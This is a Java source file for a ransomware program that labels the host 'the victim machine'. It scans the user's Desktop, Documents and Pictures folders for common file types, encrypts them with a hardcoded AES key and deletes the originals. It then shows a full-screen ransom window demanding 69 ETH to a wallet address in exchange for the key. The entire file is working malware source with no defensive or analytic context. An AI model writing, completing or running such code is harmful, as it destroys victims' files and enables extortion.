package mypack;

import org.apache.commons.io.*;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.*;
import javax.swing.*;
import java.awt.Color;
import java.awt.Font;


public class App {

    static JFrame f; 
    static JLabel l; 

    public enum OS {
        WINDOWS, LINUX, MAC, SOLARIS
    };

    private static OS os = null;
    public static String key = "QfTjWmZq4t7w!z%C"; // 128 - bit key for AES encryption

    public static void main(String[] args) {

        FileFinder(); 
        WarningForm();
        // Encryptor(TargetFilePath);
        // Decryptor(TargetFilePath);

    }

    public static void FileFinder() {

        switch (getOS()) {

            case WINDOWS:
                System.out.println("the victim machine is Windows OS");
                break;
            case LINUX:
                System.out.println("the victim machine is Linux OS");
                break;
            case MAC:
                System.out.println("the victim machine is Mac OS");
                break;
            case SOLARIS:
                System.out.println("the victim machine is Solaris OS");
                break;
            default:
                break;
        }

        ArrayList<String> CriticalPathList = new ArrayList<String>();

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures"); 

        for (String TargetDirectory : CriticalPathList) {

            File root = new File(TargetDirectory);

            try {

                String[] extensions = { "pdf", "doc", "png", "txt", "zip", "rar", "jpg", "sql", "xls", "bmp" };
                Collection files = FileUtils.listFiles(root, extensions, true);

                for (Object o : files) {

                    File file = (File) o;

                    Encryptor(file.getAbsolutePath());

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void FileFinder(String ext) {

        switch (getOS()) {

            case WINDOWS:
                System.out.println("the victim machine is Windows OS");
                break;
            case LINUX:
                System.out.println("the victim machine is Linux OS");
                break;
            case MAC:
                System.out.println("the victim machine is Mac OS");
                break;
            case SOLARIS:
                System.out.println("the victim machine is Solaris OS");
                break;
            default:
                break;
        }

        ArrayList<String> CriticalPathList = new ArrayList<String>();

        CriticalPathList.add(System.getProperty("user.home") + "/Desktop");
        CriticalPathList.add(System.getProperty("user.home") + "/Documents");
        CriticalPathList.add(System.getProperty("user.home") + "/Pictures"); 

        for (String TargetDirectory : CriticalPathList) {

            File root = new File(TargetDirectory);

            try {

                String[] extensions = { ext };
                Collection files = FileUtils.listFiles(root, extensions, true);

                for (Object o : files) {

                    File file = (File) o;
                    Decryptor(file.getAbsolutePath());

                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void Encryptor(String TargetFilePath) {

        File targetFile = new File(TargetFilePath); 
        File encryptedTargetFile = new File(TargetFilePath + ".encrypted"); 

        try {

            CryptoUtils.encrypt(key, targetFile, encryptedTargetFile);

        } catch (CryptoException ex) {

            ex.printStackTrace();
        }

        targetFile.delete();

    }

    public static void WarningForm() {

        f = new JFrame("Warning");
        l = new JLabel();

        l.setText("Warning: All your important files are encrypted, in order to decrypt these files send 69 ETHs on 0xB3445b16e1Bbdacb33Dd85309d24A5b356f6Fda3 and obtain the key.");
        //font size and colour
        l.setFont(new Font("Arial", Font.BOLD, 16));
        l.setForeground(Color.RED);


        JPanel p = new JPanel();

        p.add(l);
        f.add(p);

        // ----input key for restoring files

        JPanel panel = new JPanel();
        JLabel label = new JLabel(" Enter the key : ");
        JTextField tf = new JTextField(10);

        JButton submit = new JButton("Restore my files");
        submit.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {

                String strVictimKey = tf.getText();

                if (strVictimKey.equalsIgnoreCase(key)) { // cmp --> helps to neutral and rescue files

                    // rescue / decrypt encrypted files on the target machine
                    JOptionPane.showMessageDialog(f,
                            "Your entered key is true, your files are now under the decryption process, wait for a while!");
                    FileFinder("encrypted");

                } else {

                    JOptionPane.showMessageDialog(f, "Your entered key is false, be careful!");
                }

            }
        });

        JButton reset = new JButton("Reset");

        panel.add(label);
        panel.add(tf);
        panel.add(submit);
        panel.add(reset);

        f.getContentPane().add(BorderLayout.NORTH, label);
        f.getContentPane().add(BorderLayout.SOUTH, panel);

        f.setVisible(true);

        f.setExtendedState(JFrame.MAXIMIZED_BOTH);
        f.setUndecorated(true);
        f.setVisible(true);

    }


    public static void Decryptor(String EncryptedFilePath) {

        File targetFile = new File(EncryptedFilePath); // private.txt.encrypted
        File decryptedTargetFile = new File(EncryptedFilePath + ".decrypted"); // private.txt

        try {

            CryptoUtils.decrypt(key, targetFile, decryptedTargetFile);

        } catch (CryptoException ex) {

            ex.printStackTrace();
        }

        targetFile.delete();

    }

    public static OS getOS() {

        if (os == null) {

            String operSys = System.getProperty("os.name").toLowerCase();

            if (operSys.contains("win")) {

                os = OS.WINDOWS;
            } else if (operSys.contains("nix") || operSys.contains("nux") || operSys.contains("aix")) {
                os = OS.LINUX;
            } else if (operSys.contains("mac")) {

                os = OS.MAC;
            } else if (operSys.contains("sunos")) { // solaris

                os = OS.SOLARIS;
            }
        }

        return os;

    }

}